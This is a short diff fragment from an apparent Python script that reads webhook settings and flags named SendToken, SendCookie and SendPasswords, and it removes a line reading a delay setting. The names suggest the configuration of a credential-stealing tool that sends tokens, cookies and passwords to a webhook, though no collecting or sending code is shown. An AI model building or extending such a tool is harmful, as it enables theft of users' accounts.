@@ -98,7 +98,6 @@ Bot_Avatar = webhook_configs['Bot_Avatar']
 SendToken = other_configs['SendToken']
 SendCookie = other_configs['SendCookie']
 SendPasswords = other_configs['SendPasswords']
-delay = other_configs['Delay']
 
 text()
 
